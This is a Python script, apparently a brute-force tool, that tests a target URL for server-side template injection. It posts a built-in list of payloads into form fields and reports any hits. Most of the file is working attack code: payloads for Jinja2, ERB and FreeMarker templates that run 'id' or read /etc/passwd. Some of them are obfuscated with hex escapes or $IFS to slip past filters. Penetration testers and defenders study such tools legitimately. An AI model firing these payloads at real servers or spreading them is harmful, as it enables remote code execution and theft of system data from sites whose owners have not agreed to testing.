import pycurl
from io import BytesIO
import sys
import requests

header_list = [
    "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Content-Type: application/x-www-form-urlencoded"
]

def send_post_request(url, body, headers):
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, url.encode('utf-8'))
    c.setopt(c.WRITEDATA, buffer)
    c.setopt(c.POSTFIELDS, body.encode('utf-8'))
    c.setopt(c.HTTPHEADER, headers)
    c.setopt(c.FOLLOWLOCATION, True)

    try:
        c.perform()
        response = buffer.getvalue().decode('utf-8')
        return response
    except pycurl.error as e:
        print(f"Request failed: {e}")
        return ""
    finally:
        c.close()

print("Ice-Ice-Tea-Ay!")
print("A Brute-Force Tool to check SSTI vulnerability on Jinja2/Flask-based web servers.\n")
url = input("Please put the URL target here: ").strip()
body_template = input("Insert a header body (place '&x' inside the body): ").strip()
num = input("1. Number eval check \n2. Remote Code Execution (RCE) check \n3. Check all possible code \nChoose a number: ").strip()

def inject(url_value, opt, header, payload):
    if opt == "1":
        print("Checking each payload ...")
        for code in payload["num_eval"]["code"]:
            new_body = header.replace("&x", code)
            response = send_post_request(url_value, new_body, header_list)
            if any(key in response for key in payload["num_eval"]["has"]):
                print("Found One!")
                print(f"Payload: {code}")
                print(f"Response:\n{response}")
                return
            print("No SSTI Vulnearability Found")
    elif opt == "2":
        print("Checking each payload ...")
        for code in payload["rce_and_read"]["code"]:
            new_body = header.replace("&x", code)
            response = send_post_request(url, new_body, header_list)
            if any(key in response for key in payload["rce_and_read"]["has"]):
                print("Found One!")
                print(f"Payload: {code}")
                print(f"Response:\n{response}")
                return
    elif opt == "3":
        print("Checking all payloads ...")
        payload = {
            "has": payload["num_eval"]["has"] + payload["rce_and_read"]["has"],
            "code": payload["num_eval"]["code"] + payload["rce_and_read"]["code"]
        }
        for code in payload["code"]:
            new_body = header.replace("&x", code)
            response = send_post_request(url, new_body, header_list)
            if any(key in response for key in payload["has"]):
                print("Found One!")
                print(f"Payload: {code}")
                print(f"Response:\n{response}")
                return
        print("No SSTI vulnerability found.")
    else:
        print("No valid option selected.")

payload = {
    "num_eval": {
        "has": ["4096", "646464"],
        "code": [
            "{{64*64}}[[64*64]]",
            "{{64*64}}",
            "{{64*'64'}}",
            "<%= 64 * 64 %>",
            "${64*64}",
            "${{64*64}}",
            "@(64+64)",
            "#{64*64}",
            "#{ 64 * 64 }"
        ]
    },
    "rce_and_read": {
        "has": ["uid", "gid", "root"],
        "code": [
            "{{''.__class__.__base__.__subclasses__()[227]('id', shell=True, stdout=-1).communicate()}}",
            "<%= File.open('/etc/passwd').read %>",
            '${"freemarker.template.utility.Execute"?new()("id")}',
            '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
            "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
            '{{ ''.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}',
            '{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}',
            "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{['id']|filter('system')}}",
            "{{['cat\x20/etc/passwd']|filter('system')}}",
            "{{['cat$IFS/etc/passwd']|filter('system')}}",
            "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
        ]
    }
}

try:
    print("Checking for connection... ", end="\r", flush=True)
    response = requests.get(url, timeout=10)
    if response.status_code:
        print(60*" ", end="\r")
        print("Connected! ")
        inject(url, num, body_template, payload)
    else:
        print(f"Connected, but got status code: {response.status_code}")
except requests.ConnectionError:
    print("Connection failed: Unable to connect.")
except requests.Timeout:
    print("Connection failed: Timed out.")
except requests.RequestException as e:
    print(f"An error occurred: {e}")

